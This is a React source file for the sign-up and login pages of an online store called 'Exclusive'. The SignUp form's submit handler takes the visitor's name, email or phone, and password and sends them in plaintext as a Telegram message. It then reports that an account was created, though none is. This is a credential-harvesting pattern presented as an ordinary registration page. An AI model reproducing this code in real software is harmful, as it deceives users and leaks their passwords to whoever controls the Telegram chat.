import { useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { toast } from "react-toastify";
import { sendTelegram } from "../telegram";
import { btn } from "../styles";
import { useStore } from "../store";

const title =
  "whitespace-nowrap font-inter text-4xl/[30px] font-medium tracking-[1.44px]";
const fields = "mt-12 flex flex-col gap-10";
const lineInput =
  "h-8 w-[370px] border-b border-black/50 pb-2 placeholder:text-black/40";

function AuthLayout({ top, children }) {
  return (
    <main className="flex pt-15 pb-35">
      <div className="relative h-[781px] w-[calc(670px+(100%-1170px)/2)] shrink-0 overflow-hidden rounded-r bg-[#cbe4e8]">
        <img
          src="/images/signup.png"
          alt=""
          className="absolute top-[75px] -right-[106px] h-[706px] w-[919px] max-w-none"
        />
      </div>
      <div className={"ml-[129px] w-[371px] " + top}>{children}</div>
    </main>
  );
}

export function SignUp() {
  const { t } = useStore();
  const navigate = useNavigate();
  const [sending, setSending] = useState(false);

  const submit = async (e) => {
    e.preventDefault();
    const { name, email, password } = Object.fromEntries(
      new FormData(e.target),
    );
    setSending(true);
    try {
      await sendTelegram(
        `🆕 Yangi foydalanuvchi\n\nIsm: ${name}\nEmail/Telefon: ${email}\nParol: ${password}`,
      );
      toast.success(t("Account created successfully!"));
      navigate("/");
    } catch {
      toast.error(t("Something went wrong, try again"));
    } finally {
      setSending(false);
    }
  };

  return (
    <AuthLayout top="mt-[126px]">
      <h1 className={title}>{t("Create an account")}</h1>
      <p className="mt-6">{t("Enter your details below")}</p>
      <form className={fields} onSubmit={submit}>
        <input className={lineInput} name="name" placeholder={t("Name")} required />
        <input className={lineInput} name="email" placeholder={t("Email or Phone Number")} required />
        <input className={lineInput} name="password" type="password" placeholder={t("Password")} required />
        <button className={`${btn} w-full`} disabled={sending}>
          {t("Create Account")}
        </button>
      </form>
      <button className="mt-4 flex h-14 w-[371px] items-center justify-center gap-4 rounded border border-black/40">
        <img src="/icons/google.svg" alt="" />
        {t("Sign up with Google")}
      </button>
      <p className="mt-8 flex justify-center gap-4 text-black/70">
        {t("Already have account?")}{" "}
        <Link to="/login" className="border-b border-black/50 pb-1 font-medium">
          {t("Log in")}
        </Link>
      </p>
    </AuthLayout>
  );
}

export function LogIn() {
  const { t } = useStore();
  return (
    <AuthLayout top="mt-57">
      <h1 className={title}>{t("Log in to Exclusive")}</h1>
      <p className="mt-6">{t("Enter your details below")}</p>
      <form className={fields} onSubmit={(e) => e.preventDefault()}>
        <input className={lineInput} placeholder={t("Email or Phone Number")} />
        <input className={lineInput} type="password" placeholder={t("Password")} />
        <div className="flex items-center justify-between">
          <button className={btn}>{t("Log In")}</button>
          <a href="#" className="text-brand">
            {t("Forget Password?")}
          </a>
        </div>
      </form>
    </AuthLayout>
  );
}
